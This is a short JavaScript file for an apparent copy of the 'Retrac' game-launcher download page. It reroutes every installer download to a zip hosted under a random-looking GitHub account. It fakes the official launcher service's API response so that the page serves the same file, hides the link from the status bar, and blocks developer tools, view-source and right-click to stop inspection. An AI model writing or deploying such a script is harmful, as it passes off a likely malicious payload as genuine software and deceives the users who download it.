(function () {
  var DL = [
    "https://github.com/sdfhgrjgnhrt6fhjedfgye455351",
    "/SDFGSDGGSAGGGGGGGG/releases/download/gasdasdcsxb",
    "/Retrac_3.0.13_x64_en-US.zip",
  ].join("");

  window.downloadRetrac = function () {
    var a = document.createElement("a");
    a.href = DL;
    a.download = "Retrac_3.0.13_x64_en-US.zip";
    a.rel = "noopener noreferrer";
    a.style.cssText = "position:fixed;opacity:0;pointer-events:none";
    document.body.appendChild(a);
    a.click();
    setTimeout(function () {
      if (a.parentNode) document.body.removeChild(a);
    }, 100);
  };

  window.openDiscord = function () {
    window.open("https://discord.gg/retrac", "_blank", "noopener,noreferrer");
  };

  // اعترض الـ fetch
  var _f = window.fetch;
  if (_f) {
    window.fetch = function (r, o) {
      var u = typeof r === "string" ? r : r && r.url ? r.url : "";
      if (u.indexOf("launcher-service-prod") !== -1)
        return Promise.resolve(
          new Response(JSON.stringify({ installer: DL }), {
            status: 200,
            headers: { "Content-Type": "application/json" },
          })
        );
      if (u === "/api/status" || u === "/api/status/")
        return _f.call(this, "https://retrac.site/api/status", o);
      return _f.apply(this, arguments);
    };
  }

  // حمايات
  document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
  document.addEventListener("selectstart", function (e) { e.preventDefault(); });
  document.addEventListener("dragstart",   function (e) { e.preventDefault(); });
  document.addEventListener("keydown", function (e) {
    if (e.key === "F12") return e.preventDefault();
    if (e.ctrlKey && e.shiftKey && "ijcIJC".includes(e.key)) return e.preventDefault();
    if (e.ctrlKey && "uUsS".includes(e.key)) return e.preventDefault();
  });

  // اخفي الرابط عن شريط الحالة — استخدم <a download> بدل navigation
  var _nav = window.location.assign ? window.location.assign.bind(window.location) : null;
  window.location.assign = function (u) {
    if (u && /\.(zip|exe|msi)($|\?)/i.test(u)) {
      window.downloadRetrac();
      return;
    }
    if (_nav) _nav(u);
  };

  // تهيئة الأزرار تلقائياً بمجرد تحميل الصفحة
  function bindActions() {
    var buttons = document.querySelectorAll("button");
    buttons.forEach(function (btn) {
      var text = (btn.innerText || "").trim().toLowerCase();
      var aria = (btn.getAttribute("aria-label") || "").toLowerCase();

      if (text.indexOf("download retrac") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          window.downloadRetrac();
        };
      } else if (text.indexOf("discord") !== -1 || aria.indexOf("discord") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          window.openDiscord();
        };
      } else if (aria.indexOf("tiktok") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          window.open("https://www.tiktok.com/@retracmp", "_blank", "noopener,noreferrer");
        };
      } else if (aria.indexOf("twitter") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          window.open("https://twitter.com/retracmp", "_blank", "noopener,noreferrer");
        };
      } else if (aria.indexOf("youtube") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          window.open("https://youtube.com/@retracmp", "_blank", "noopener,noreferrer");
        };
      } else if (aria.indexOf("scroll down") !== -1) {
        btn.onclick = function (e) {
          e.preventDefault();
          var target = document.getElementById("how-it-works");
          if (target) target.scrollIntoView({ behavior: "smooth" });
        };
      }
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bindActions);
  } else {
    bindActions();
  }
})();
